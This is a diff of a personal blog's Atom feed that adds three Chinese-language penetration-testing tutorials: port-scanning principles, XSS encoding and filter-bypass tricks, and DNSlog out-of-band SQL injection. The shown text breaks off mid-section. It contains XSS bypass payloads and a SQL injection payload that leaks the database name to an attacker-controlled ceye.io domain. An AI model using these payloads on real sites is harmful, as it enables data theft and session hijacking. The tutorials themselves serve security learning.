@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://piaogexu.github.io</id>
     <title>Gridea</title>
-    <updated>2020-11-28T06:06:23.618Z</updated>
+    <updated>2020-11-28T07:21:31.108Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://piaogexu.github.io"/>
     <link rel="self" href="https://piaogexu.github.io/atom.xml"/>
@@ -10,4 +10,2053 @@
     <logo>https://piaogexu.github.io/images/avatar.png</logo>
     <icon>https://piaogexu.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, Gridea</rights>
+    <entry>
+        <title type="html"><![CDATA[端口扫描原理]]></title>
+        <id>https://piaogexu.github.io/post/duan-kou-sao-miao-yuan-li/</id>
+        <link href="https://piaogexu.github.io/post/duan-kou-sao-miao-yuan-li/">
+        </link>
+        <updated>2020-11-28T07:20:51.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="谈谈端口探测的经验与原理">谈谈端口探测的经验与原理</h3>
+<p><strong>端口探测在渗透测试的信息收集以及威胁情报领域都有着很重要的应用，本文章将从几个方面来介绍端口探测相关的知识。</strong></p>
+<h4 id="0x00-有关端口的基础知识">0x00 有关端口的基础知识</h4>
+<h5 id="0基本概念">0.基本概念</h5>
+<p>端口并不是一个真是存在的实体，是完全抽象的，只是计算机网络中为了多个应用同时通信而创造出来的概念。它工作在OSI七层模型中的第四层网络层，属于TCP/UDP 协议中的内容。</p>
+<p>TCP和UDP各有65536个端口(0-65535)作为一种网络资源，端口是由操作系统分配和管理的一般使用netstat来查看系统的端口使用状况。</p>
+<pre><code> $  netstat -nat
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 127.0.0.1:6379          0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:6010          0.0.0.0:*               LISTEN     
+tcp        0      0 10.254.123.52:22        91.197.232.107:54098    ESTABLISHED
+tcp        0    364 10.254.123.52:22        210.13.242.2:33679      ESTABLISHED
+tcp6       0      0 :::80                   :::*                    LISTEN     
+tcp6       0      0 :::61616                :::*                    LISTEN     
+tcp6       0      0 :::22                   :::*                    LISTEN     
+tcp6       0      0 ::1:6010                :::*                    LISTEN     
+tcp6       0      0 :::8161                 :::*                    LISTEN
+</code></pre>
+<p>通常来说，一个端口只能由一个进程绑定比如apache如果绑定了80端口，如果nginx再绑定时，操作系统就会拒绝nginx的请求。</p>
+<pre><code> erro:listen tcp 0.0.0.0:80: bind: address already in use
+</code></pre>
+<p>但是注意，由于端口是完全抽象的概念，仅仅是一种标识，因此<strong>不同协议的相同端口是不会发生任何冲突</strong>的也就是说，进程 A 绑定了TCP的80端口，进程 B 再去绑定UDP的80端口时，是没有任何问题的。</p>
+<p>在0-65535这些端口中，0-1023这1024个端口是系统的保留端口，为一些关键服务预留的。如果想要绑定这些端口，必须具有系统的最高权限(ROOT)，而其他的端口只需要用户权限即可。</p>
+<h4 id="0x00-端口扫描工具">0x00 端口扫描工具</h4>
+<h5 id="0nmap">0.nmap</h5>
+<p>最为大名鼎鼎的端口扫描工具，支持许多种探测，可以使用各种类型的包进行探测，支持SYN、Ping、Xmas等数十种扫描方式。</p>
+<ul>
+<li>操作系统</li>
+<li>banner</li>
+<li>服务的类型</li>
+<li>服务的版本</li>
+</ul>
+<p><strong>1.zmap</strong></p>
+<p><strong>2.masscan</strong></p>
+<p>这两种工具的特点就是速度极快，可以在很短时间内扫描大量主机。</p>
+<p><strong>3.nc</strong></p>
+<p>相对于其他几种自动化探测的工具，使用nc进行端口探测可以说是纯手动的方式了。</p>
+<h4 id="0x02-常见的用途">0x02 常见的用途</h4>
+<h5 id="0-识别服务">0. 识别服务</h5>
+<p>一般来说，每一个服务都有固定的一个默认端口最常见的，如：</p>
+<p>常见的系统端口</p>
+<table>
+<thead>
+<tr>
+<th>端口</th>
+<th>服务</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>21</td>
+<td>ftp</td>
+</tr>
+<tr>
+<td>22</td>
+<td>ssh</td>
+</tr>
+<tr>
+<td>23</td>
+<td>telnet</td>
+</tr>
+<tr>
+<td>25</td>
+<td>smtp</td>
+</tr>
+<tr>
+<td>80</td>
+<td>http</td>
+</tr>
+<tr>
+<td>110</td>
+<td>pop3</td>
+</tr>
+<tr>
+<td>135</td>
+<td>rpc</td>
+</tr>
+<tr>
+<td>139</td>
+<td>netbios</td>
+</tr>
+<tr>
+<td>445</td>
+<td>smb</td>
+</tr>
+</tbody>
+</table>
+<p>常见的Web server的端口</p>
+<table>
+<thead>
+<tr>
+<th>端口</th>
+<th>服务</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>80</td>
+<td>apache/nginx</td>
+</tr>
+<tr>
+<td>8080</td>
+<td>tomcat/beego</td>
+</tr>
+<tr>
+<td>5000</td>
+<td>flash</td>
+</tr>
+<tr>
+<td>3000</td>
+<td>nodejs</td>
+</tr>
+<tr>
+<td>8000</td>
+<td>django</td>
+</tr>
+<tr>
+<td>3000</td>
+<td>ruby on rails</td>
+</tr>
+<tr>
+<td>8888</td>
+<td>react</td>
+</tr>
+</tbody>
+</table>
+<p>常见的各类数据库的端口</p>
+<table>
+<thead>
+<tr>
+<th>端口</th>
+<th>服务</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>3306</td>
+<td>mysql</td>
+</tr>
+<tr>
+<td>1521</td>
+<td>oracle</td>
+</tr>
+<tr>
+<td>1433</td>
+<td>SQL-server</td>
+</tr>
+<tr>
+<td>5432</td>
+<td>PostgreSQL</td>
+</tr>
+<tr>
+<td>50000</td>
+<td>DB2</td>
+</tr>
+<tr>
+<td>5000</td>
+<td>sybase</td>
+</tr>
+<tr>
+<td>6379</td>
+<td>Redis</td>
+</tr>
+<tr>
+<td>27017</td>
+<td>mongoDB</td>
+</tr>
+<tr>
+<td>11211</td>
+<td>memcached</td>
+</tr>
+<tr>
+<td>60000</td>
+<td>HBase</td>
+</tr>
+</tbody>
+</table>
+<p>般来说，对应的服务都会开在对应的端口上，以便访问(比如浏览器在不指定端口时会访问80端口，ssh不指定端口的时候会连接22端口)</p>
+<p>但是，也有许多运维工程师和主机管理员为了避免安全问题，会把服务避开默认端口比如，把ssh开到80端口上，这就给探测服务带来了很大难度。</p>
+<p>这个时候，就需要完成TCP连接,然后对于服务的内容进行试探，从返回的字符流中获取的服务的相关信息对于探测服务来说，可以使用nmap的 -sV选项：</p>
+<pre><code>$  nmap -sV localhost
+Starting Nmap 6.47 ( http://nmap.org ) at 2017-08-25 20:11 CST
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.0000060s latency).
+Other addresses for localhost (not scanned): 127.0.0.1 127.0.1.1
+Not shown: 993 closed ports
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 2.3.5
+22/tcp   open  ssh     OpenSSH 6.0p1 Debian 4+deb7u4 (protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
+111/tcp  open  rpcbind 2-4 (RPC #100000)
+3306/tcp open  mysql   MySQL 5.5.52-0+deb8u1
+8081/tcp open  http    Apache httpd 2.4.10 ((Debian))
+8082/tcp open  http    Apache httpd 2.4.10 ((Debian))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<p>对于常见的服务，nmap甚至可以探测出服务版本但是，对于很多情况,必须辅以手动探测才能达到最好的效果，这个时候就需要使用nc来进行，举几个例子对于8001端口，nc连接上去，随便输入一个字符串，得到了以下结果：</p>
+<pre><code>$ nc -vv localhost 8001  
+localhost [127.0.0.1] 8001 (?) open
+asd
+HTTP/1.1 400 Bad Request
+Date: Fri, 25 Aug 2017 12:15:25 GMT
+Server: Apache/2.4.23 (Debian)
+Content-Length: 301
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;400 Bad Request&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Bad Request&lt;/h1&gt;
+&lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;
+&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.23 (Debian) Server at 127.0.0.1 Port 8001&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre>
+<p>由此我们知道了这是一个http服务，因为我们发送的字符串不是一个合法的HTTP请求，因此返回一个400 Bad requests，我们还得到了系统的版本是Debian，WebServer是Apache。</p>
+<p>再举一个例子：</p>
+<pre><code>$ nc -vv localhost 3306
+localhost [127.0.0.1] 3306 (mysql) open
+L
+5.7.15-1
+ttsEs!eCl AlJmysql_native_passwordsdad
+Got packets out of order sent 5, rcvd 111
+</code></pre>
+<p>连接后直接返回了字符串mysql_native_passwordsda，可以判断这是一个mysql：</p>
+<pre><code>$ nc -vv localhost 22  
+localhost [127.0.0.1] 22 (ssh) open
+SSH-2.0-OpenSSH_7.3p1 Debian-3+b1
+asd
+Protocol mismatch.
+ sent 4, rcvd 54
+</code></pre>
+<p>也是同样，直接暴露出了SSH的服务。</p>
+<h5 id="根据端口信息判断一个ip属于何种类型">根据端口信息判断一个IP属于何种类型</h5>
+<p>一个公网IP可能有很多种类型可能是基站，ISP出口网关，也可能是服务器，也可能是一些网络设备如摄像头、打印机、智能硬件等。总体来说，具有开放端口的一般都是服务器，而网关和基站一般不会有任何端口处于开放状态。但是也不排除有个别基站的防火墙会将一些特定的端口重定向到一些服务器上(一般是运营商的官网)。。</p>
+<p>但是，如果开放 21(ftp) 22 (ssh) 23(telnet)则可以基本确定是服务器。</p>
+<p>智能硬件的端口一般在3000-10000的范围内，一个不确定的端口。</p>
+<p>打印机有几个很大概率的端口，比如515 等，有些打印机也有自己的一个web端的管理后台，通常放在80或者8080。</p>
+<p>根据端口扫描的结果，我们可以粗略的判断一个ip背后是属于哪一种设备。</p>
+<h4 id="0x03-端口探测的原理">0x03 端口探测的原理</h4>
+<h5 id="0探测状态的原理">0.探测状态的原理</h5>
+<p>首先，我们要明白,端口的三种状态，分别是：<code>OPEN</code>、<code>CLOSED</code>、<code>FILTERED</code>。</p>
+<ol>
+<li>OPEN</li>
+</ol>
+<pre><code>端口处于OPEN状态,代表着
+
+这个端口是开放的,可以被访问
+这个端口上面有进程(应用程序监听)
+</code></pre>
+<ol start="2">
+<li>Filtered</li>
+</ol>
+<pre><code>这个端口不会返回任何东西
+可能是被防火墙屏蔽了,也就是说,这个包被丢弃了
+</code></pre>
+<ol start="3">
+<li>Closed</li>
+</ol>
+<pre><code>这个端口是可以被访问的
+这个端口上没有程序监听,但是会返回包
+</code></pre>
+<p>以TCP-SYN 探测为例：</p>
+<pre><code>OPEN 返回 SYN-ACK 
+
+CLOSED 返回 RST 
+
+FILTERED 啥都不反回
+</code></pre>
+<p>附注:</p>
+<p>防火墙不一定会完全丢弃(DROP)包，也可根据用户的设置来进行其他操作以iptables为例：</p>
+<pre><code>iptables -A  INPUT -p TCP --dport 22 -j REJECT --reject-with ICMP echo-reply
+</code></pre>
+<p>将-j设置为REJECT就可以显示为CLOSED而设置为DROP的时候显示为FILTERED当然,还有其他的选项，比如REDIRECT之类的，有其他不同的操作。</p>
+<h5 id="1探测操作系统版本和服务的原理">1.探测操作系统版本和服务的原理</h5>
+<p>探测服务大多是根据banner和fingerprint来进行探测的。不同的操作系统以及不同版本的系统在TCP/IP协议上指纹参数的设定存在差异。Nmap通过收集这些参数进行比对得到系统的类型和版本信息，如果可以直接抓到banner，那么很大概率上可以直接的拿到服务类型和版本。但是如果没有，就要根据已知的指纹信息，来进行对应的推测。</p>
+<p>如果遇到了在数据库中找不到的指纹，nmap会请求用户提交该指纹和对应的服务，添加到数据库中，来丰富整个的指纹数据库，对于nmap来说，很多小众的服务是依赖于用户提交的，如下图：</p>
+<pre><code>$ nmap -sV *****.io       
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-08-31 17:47 CST
+Nmap scan report for *****.io (0.0.0.0)
+Host is up (0.000070s latency).
+Not shown: 988 closed ports
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.3p1 Debian 3+b1 (protocol 2.0)
+25/tcp   open  smtp        Sendmail 8.15.2/8.15.2/Debian-6
+80/tcp   open  http        Apache httpd 2.4.23 ((Debian))
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+587/tcp  open  smtp        Sendmail 8.15.2/8.15.2/Debian-6
+631/tcp  open  ipp         CUPS 2.2
+1080/tcp open  socks5      (No authentication; connection failed)
+3306/tcp open  mysql       MySQL 5.7.15-1
+1 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port5432-TCP:V=7.40%I=7%D=8/31%Time=59A7DB1D%P=x86_64-pc-linux-gnu%r(SM
+SF:BProgNeg,8F,&quot;E\0\0\0\x8eS\xe8\x87\xb4\xe5\x91\xbd\xe9\x94\x99\xe8\xaf\x
+SF:af\0VFATAL\0C0A000\0M\xe4\xb8\x8d\xe6\x94\xaf\xe6\x8c\x81\xe7\x9a\x84\x
+SF:e5\x89\x8d\xe7\xab\xaf\xe5\x8d\x8f\xe8\xae\xae\x2065363\.19778:\x20\xe6
+SF:\x9c\x8d\xe5\x8a\xa1\xe7\xab\xaf\xe6\x94\xaf\xe6\x8c\x81\x201\.0\x20\xe
+SF:5\x88\xb0\x203\.0\0Fpostmaster\.c\0L2008\0RProcessStartupPacket\0\0&quot;)%r
+SF:(Kerberos,8F,&quot;E\0\0\0\x8eS\xe8\x87\xb4\xe5\x91\xbd\xe9\x94\x99\xe8\xaf\
+SF:xaf\0VFATAL\0C0A000\0M\xe4\xb8\x8d\xe6\x94\xaf\xe6\x8c\x81\xe7\x9a\x84\
+SF:xe5\x89\x8d\xe7\xab\xaf\xe5\x8d\x8f\xe8\xae\xae\x2027265\.28208:\x20\xe
+SF:6\x9c\x8d\xe5\x8a\xa1\xe7\xab\xaf\xe6\x94\xaf\xe6\x8c\x81\x201\.0\x20\x
+SF:e5\x88\xb0\x203\.0\0Fpostmaster\.c\0L2008\0RProcessStartupPacket\0\0&quot;);
+</code></pre>
+<h5 id="2不同扫描方式的原理">2.不同扫描方式的原理</h5>
+<ol>
+<li>
+<p>TCP扫描</p>
+<p>nmap target-host既上面说的TCP方式，发送SYN，等待回应，这种方法的优点就是准确性比较高但是需要完成整个的三次握手流程，而且对于filtered的端口需要进行在timeout之前的等待，所以严重的拖慢了速度。</p>
+</li>
+<li>
+<p>半连接扫描</p>
+<p>nmap -sS target-host这种方式与上面的TCP扫描类似，不同的是，如果收到了服务器发来的SYN-ACK ，则直接发送RST给服务器，中断连接，以加快扫描的速度。</p>
+</li>
+<li>
+<p>FIN扫描</p>
+<p>nmap -sF target-hostFIN扫描是一种非常快的扫描，因为直接给目标端口发送一个带FIN标志位的包，开放(有服务监听的)的端口见到FIN包会将其丢弃，而CLOSED状态的端口则会照常的发送一个RST包，告知这个端口没有监听服务。</p>
+<p>但是，这种扫描有一个严重的缺点，那就是FILTERED状态的端口也会直接丢弃，因此不能够区分OPEN/FILTERD两种状态的端口，只能区分这两种与CLOSED之间的区别。</p>
+</li>
+<li>
+<p>Xmas扫描</p>
+<p>nmap -sX target-hostXmas扫描时，会将TCP中的所有标识位(ACK、FIN、RST、SYN、URG、PSH)都置为1，端口开放的时候，不会返回任何的信息，而当关闭的时候，将返回RST,这与FIN扫描十分类似，同样不能区分OPEN 和 FILTERED。</p>
+</li>
+<li>
+<p>NULL扫描</p>
+<p>nmap -sN target-host与Xmas扫描恰恰相反的是，NULL扫描将每一个表示为都置为0，但是Unix服务器反应与Xmas，FIN扫描一致，但是不太一样的是Windows主机的反应，Windows主机的所有端口都会返回一个RST，用这一点，可以区分开Unix与windows服务器。</p>
+</li>
+<li>
+<p>FTP弹跳扫描</p>
+<p>nmap -b target-hostRFC-959支持代理FTP连接。它允许一个用户连接一个FTP服务器然后请求文件发送给第三方服务器。大多数服务器已经停止支持它了。它可以允许FTP服务器来进行其它.Idlescan机器的端口扫描。只是简单的请求FTP服务器发送一个文件给每个目标主机的感兴趣的端口一个错误报文会描述端口是否开放。这是一个好办法来绕过防火墙因为FTP服务器常常被置于可以访问比Web主机更多其它内部主机的位置。</p>
+</li>
+<li>
+<p>zmap,masscan的快速扫描方式 : 无状态扫描</p>
+<p>zmap和masscan都号称能在xx分钟内扫描完整个IPv4，那么为什么这么快呢？</p>
+<p>那就是因为，他们在快速扫描的时候，使用的是无状态扫描的方法。我们知道，tcp连接是有状态的，需要对SYN-ACK包进行seq number 的校验这个等待连接的过程需要在缓冲区占用很大的资源，因此限制了扫描的速度。</p>
+<p>但是，无状态扫描中，zmap记录了revicer ip、hash之后保存到send port 和seq number，然后再等待SYN-ACK中返回的相应信息直接进行校验，而不需要建立连接。</p>
+<p>通俗的来说，传统的扫描方式是1对1的建立连接通信进行验证，而无状态的扫描就是批量的把请求撒出去，然后记录有回应的IP。</p>
+<p>因此，效率上可以达到了成千上万倍的提高。但是同时，由于无状态的发包方式，如果遇到丢包的情况，不像有连接时候会进行重复查询，而是直接没有回应，因此准确率上不如SYN扫描那么准确，但是可以用重复扫描来弥补准确性上面的缺陷。</p>
+</li>
+</ol>
+<h4 id="0x04-总结">0x04 总结</h4>
+<p>端口探测有着多种多样的方式，手动探测和nmap适合对于单一或有限主机的扫描，而zmap，masscan适用于一整个C段或者整个内网的扫描。</p>
+<p>而扫描的准确度越高，信息收集的越多，扫描的速度就成指数级递减，因此也就引出了两种攻击策略：</p>
+<ol>
+<li>
+<p>针对性攻击</p>
+<p>在预设目标下，目的就是拿下这台主机，那么在做探测和扫描的时候，就可以无微不至对每一个细节进行探测。</p>
+</li>
+<li>
+<p>广撒网攻击</p>
+<p>这种攻击必定是要遗漏掉太多的东西的，但是通过批量的处理,可以增大我们拿下主机的效率，当然,这也决定了我们在做扫描的时候必须克制。比如说只对80、3306、445、3389等比较敏感的端口进行探测，而放弃其他几率比较小的端口，以增大概率。</p>
+</li>
+</ol>
+<p>我们可以根据实际的场景去选择自己需要的攻击和探测方式，但是确定无疑的是，我们在探测、扫描、信息收集上面做的更多，将会成倍的降低我们后面继续渗透的难度，甚至可能通过一些不起眼的地方一剑封喉。因此，这是每个渗透测试者必须熟练的基本技能。</p>
+<p>banner抓取是应用程序指纹识别而不是操作系统指纹识别</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[XSS编码与绕过]]></title>
+        <id>https://piaogexu.github.io/post/xss-bian-ma-yu-rao-guo/</id>
+        <link href="https://piaogexu.github.io/post/xss-bian-ma-yu-rao-guo/">
+        </link>
+        <updated>2020-11-28T07:20:41.000Z</updated>
+        <content type="html"><![CDATA[<h4 id="url编码">URL编码</h4>
+<p>URL只允许用US-ASCII字符集中可打印的字符(0x20—0x7x)，其中某些字符在HTTP协议里有特殊的意义，所以有些也不能使用。这里有个需要注意的，+加号代表URL编码的空格，%20也是。</p>
+<p>URL编码最长见的是在用GET/POST传输时，顺序是把字符改成%+ASCII两位十六进制(先把字符串转成ASCII编码，然后再转成十六进制)。</p>
+<h4 id="unicode编码">unicode编码</h4>
+<p>Unicode有1114112个码位，也就是说可以分配1114112个字符。Unicode编码的字符以%u为前缀，后面是这个字符的十六进制unicode的码点。</p>
+<p>Unicode编码之所以被本文提到，因为有的站点过滤了某些字符串的话，但是发现这个站点在后端验证字符串的时候，识别unicode编码，那我们就可以把我们的攻击代码来改成unicode编码形式，就可以绕过站点的过滤机制了。</p>
+<h4 id="html编码">HTML编码</h4>
+<p>HTML编码的存在就是让他在代码中和显示中分开， 避免错误。他的命名实体：构造是&amp;加上希腊字母，字符编码：构造是&amp;#加十进制、十六进制ASCII码或unicode字符编码，而且浏览器解析的时候会先把html编码解析再进行渲染。但是有个前提就是必须要在“值”里，比如属性src里，但却不能对src进行html编码。不然浏览器无法正常的渲染。</p>
+<p>例如：</p>
+<pre><code>&lt;img src=&amp;#108;&amp;#111;&amp;#103;&amp;#111;&amp;#46;&amp;#112;&amp;#110;&amp;#103;/&gt;
+</code></pre>
+<p>可以正常显示。</p>
+<p>但是当你把src或者img进行html编码就不行了，例如：</p>
+<pre><code>&lt;img &amp;#115;&amp;#114;&amp;#99;=&amp;#108;&amp;#111;&amp;#103;&amp;#111;&amp;#46;&amp;#112;&amp;#110;&amp;#103;/&gt;
+</code></pre>
+<h4 id="css编码">CSS编码</h4>
+<p>这个不是太常用。就是/斜杠加上1-6位十六进制</p>
+<p>之前在IE5之前都可以用expression来调用js时，这个编码很有用。 现在大多都是用于CSS小图标。</p>
+<h4 id="常见的绕过方式">常见的绕过方式</h4>
+<pre><code>&lt;sCrIpt&gt;alert(1)&lt;/script&gt;
+&lt;script%20src%3D&quot;http%3A%2F%2F0300.0250.0000.0001&quot;&gt;&lt;%2Fscript&gt;
+&lt;scr&lt;script&gt;rip&gt;alalertert&lt;/scr&lt;/script&gt;rip&gt; (需要利用waf的不完整性)
+&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 120, 115, 115, 39, 41))&lt;/script&gt;
+</code></pre>
+<p>标签属性=&quot;javascript:JS代码&quot;(只对支持js伪协议的属性起作用)</p>
+<pre><code>&lt;标签 on事件=&quot;js代码&quot;&gt;
+
+&lt;script
+woaini&gt;
+alert(123)
+&lt;/script
+woaini&gt;
+</code></pre>
+<p>浏览器下会把换行 TAB符当成空格，把后面的字符当做属性来解析</p>
+<p>等等，还有很多，其实本章说的不是太多。干干货也少的可怜。没办法我之前说的“杂谈绕过WAF”里说的太详细了，该说的都说了。我也不知道该说些什么。看看下一节吧，还有些干货。XSS绕过方面网上的资料太多太多了。想要说一些别人没说的很难。也有，只不过在http://www.freebuf.com/articles/web/54686.html 里说完了...</p>
+<p>0x07 插件安全</p>
+<p>这节本是不属于本章的，所以说这节我是特意拿出来的。也是在这里我希望大家从此注意下浏览器插件方面的安全问题。</p>
+<p>我之前在《杂谈如何绕过WAF》一文里 还有现在朋友交流的时候我也多次说过。</p>
+<p>即使你网站做的再安全，WAF再怎么完整。我利用插件照样可以绕过。插件的有它的特殊性，也是这个特殊性成就了他的安全问题，那就是“跨域”。</p>
+<p>我在里说下插件是如何渲染到页面的：</p>
+<p>用户打开网站——发送数据包——服务器响应并发送Response包——浏览器收到Response包——渲染(先渲染Response包，再渲染插件的代码)<br>
+也就是说我在插件里写了一段js，那么用户安装后，凡是打开网站。浏览器渲染后，就可以获取用户的cookies。如果攻击者事先有准备，还可以利用csrf攻击。这里我们大胆假设下：</p>
+<p>假设1：攻击者把XSS代码封装到插件里，上传到浏览器插件下载网站(管理不严，管理员根本不可能一行一行代码看)，上传成功后。用户下载，并安装。那么攻击者就可以坐在电脑前，喝着咖啡，看着不断刷新的xss数据流...</p>
+<p>假设2：攻击者拥有dedecms的csrf(可以添加管理员)，后面的和假设1一样。当网站管理员不小心安装或者使用了带有插件浏览器，网站就会被攻击者控制。有些人会问，几率那么小，怎么可能跑到我身上。是不太可能跑到你身上，倒是有可能跑到其他站长身上，当你想想中国站长有多少时，相信你就会明白了</p>
+<p>假设3：攻击者拥有某个浏览器插件的XSC漏洞，再结合插件安全问题，就可以实现用户打开某个网站，就会被不知不觉中安装插件，有些人会说，有XSC我就直接执行任意代码了，谁还蛋疼式的去安装插件。如果攻击者想隐蔽式的攻击呢？而且控制电脑获取cookies我想这个应该比直接安装插件更加麻烦吧？当然攻击者也可以两个同时进行。</p>
+<p>当然了，也有很多人会说，我安装安全健康绿色无污染的插件不就不怕了吗。</p>
+<p>楼主说的十分有理，只不过你忽视了插件本身的安全问题，我之前所说的都是利用插件的特殊性来完成攻击，可是我并没有说插件本身的安全。</p>
+<p>这时恐怕又有人质疑了，插件即使不安全，那也需要用户输入特殊的字符串里完成攻击，你这不就是在自己插自己么。</p>
+<p>我所说的插件安全问题指的不是这，而是控制插件的数据流。因为插件的安全问题本身就没多大的利用价值，大多数时候都是自己插自己。</p>
+<p>假设有一个在线翻译的插件，鼠标滑词，自动翻译。而这个技术就需要利用到AJAX，而AJAX利用的就是厂商提供的API，而API很多时候都在二级域名，安全性相对来说就比较低了。如果控制API了，那么就可以控制API发送给插件的数据流，从而达到攻击。</p>
+<p>流程图就是下面这样：</p>
+<p>黑客发现插件调取的API网站安全漏洞——重写了发送的数据包——插件获取被重写API数据——解析并把恶意代码渲染到页面——攻击成功。<br>
+当然了，不止API，有的插件还调用了外部的JS、CSS、iframe(HTML)等，我们也可以控制他们里来完成攻击。</p>
+<p>为了让大家感到插件问题是时候注意下了，我放出一个小漏洞吧，之前在JSEC沙龙演示过的。危害不算太大，不过让大家从此注意插件问题应该够了。</p>
+<p>遨游浏览器漏洞打包.rar</p>
+<p>双击ceshi.mxaddon文件就行了(需要安装遨游浏览器)。ceshi目录里是源代码，def.json是遨游插件漏洞(打开遨游插件管理页面，就会弹窗。Test.js也就是我这节说的。当你打开任何网站的时候，他都会弹窗)。</p>
+<p>谁想提交就提交吧，当然我相信这时候遨游安全团队已经看到并修复了。我就喜欢看一群黑客和修复漏洞人员互相比速度。<br>
+相信这时有人开始骂我了。没办法，我就是不喜欢提交，任性。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[DNSlog]]></title>
+        <id>https://piaogexu.github.io/post/dnslog/</id>
+        <link href="https://piaogexu.github.io/post/dnslog/">
+        </link>
+        <updated>2020-11-28T07:20:31.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="巧用dnslog实现无回显注入">巧用DNSlog实现无回显注入</h3>
+<h4 id="0x01-dnslog回显原理">0x01  DNSLOG回显原理</h4>
+<p>测试一些网站的时候，一些注入都是无回显的，我们可以写脚本来进行盲注，但有些网站会<code>ban</code>掉我们的<code>ip</code>，这样我们可以通过设置<code>ip</code>代理池解决，</p>
+<p>但是盲注往往效率很低，所以产生了<code>DNSlog</code>注入。具体原理如下。</p>
+<p>首先需要有一个可以配置的域名，比如：<code>ceye.io</code>，然后通过代理商设置域名 <code>ceye.io</code> 的 <code>nameserver</code> 为自己的服务器 <code>A</code>，然后再服务器 <code>A</code> 上配置好 <code>DNS</code> <code>Server</code>，这样以来所有 <code>ceye.io</code> 及其子域名的查询都会到 服务器 A 上，这时就能够实时地监控域名查询请求了，图示如下。</p>
+<figure data-type="image" tabindex="1"><img src="https://i.loli.net/2020/10/28/w7MFhlADNouxZHc.png" alt="1298490-20171216200508702-1121770116.png" loading="lazy"></figure>
+<p>DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，来获取信息<br>
+简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息。</p>
+<h4 id="0x02-dnslog回显demo">0x02  DNSLOG回显Demo</h4>
+<p>这样说原理很抽象，下面通过实际例子看下。有时候<code>http://ceye.io</code>访问太慢，推荐使用<code>http://www.dnslog.cn</code>平台或者<code>t00ls</code>的<code>DNSLOG</code>平台。下面以<code>http://ceye.io</code> 为例子。</p>
+<p><code>http://ceye.io</code> 这是一个免费的记录<code>dnslog</code>的平台，我们注册后到控制面板会给你一个二级域名：<code>xxx.ceye.io</code>,当我们把注入信息放到三级域名那里，后台的日志会记录下来。</p>
+<h4 id="0x03-sql盲注">0x03 SQL盲注</h4>
+<p>就以<code>sql</code>盲注为例，后端数据库用的<code>mysql</code>数据库，说一下用<code>dnslog</code>回显只能用于<code>windows</code>系统，原理就是<code>'\\\\'</code>代表Microsoft <code>Windows</code>通用命名约定（UNC）的文件和目录路径格式利用任何以下扩展存储程序引发DNS地址解析。双斜杠表示网络资源路径多加两个\就是转义了反斜杠。深入理解下DNSlog注入过程：</p>
+<p>通过<code>DNSlog</code>盲注需要用的<code>load_file()</code>函数，所以一般得是<code>root</code>权限。<code>show variables like '%secure%'</code>;查看<code>load_file()</code>可以读取的磁盘。</p>
+<ol>
+<li>
+<p>当<code>secure_file_priv</code>为空，就可以读取磁盘的目录。</p>
+</li>
+<li>
+<p>当<code>secure_file_priv</code>为<code>G:\</code>，就可以读取G盘的文件。</p>
+</li>
+<li>
+<p>当<code>secure_file_priv</code>为<code>null</code>，<code>load_file</code>就不能加载文件。</p>
+</li>
+</ol>
+<figure data-type="image" tabindex="2"><img src="https://i.loli.net/2020/10/28/4rnS9Ujq1JPha8I.png" alt="1298490-20171216202407296-81048198.png" loading="lazy"></figure>
+<p>通过设置<code>my.ini</code>来配置。<code>secure_file_priv=&quot;&quot;</code>就是可以<code>load_flie</code>任意磁盘的文件。<br>
+<img src="https://i.loli.net/2020/10/28/oagHwmpPfKzZ9sX.png" alt="1298490-20171216202748999-1910455572.png" loading="lazy"></p>
+<p>在mysql命令行执行：select load_file('\\afanti.xxxx.ceye.io\aaa');其中afanti就是要注入的查询语句</p>
+<p>查看平台，dnsLog被记录下来。</p>
+<figure data-type="image" tabindex="3"><img src="https://i.loli.net/2020/10/28/LhW1vPY8CbAFocj.png" alt="1298490-20171216203651983-114953403.png" loading="lazy"></figure>
+<p><code>load_file()</code>函数可以通过dns解析请求。</p>
+<p>以sql-labs第五关：</p>
+<pre><code>payload：' and if((select load_file(concat('\\\\',(select database()),'.xxxxx.ceye.io\\abc'))),1,0)-- -+
+</code></pre>
+<p>执行的<code>sql</code>语句：</p>
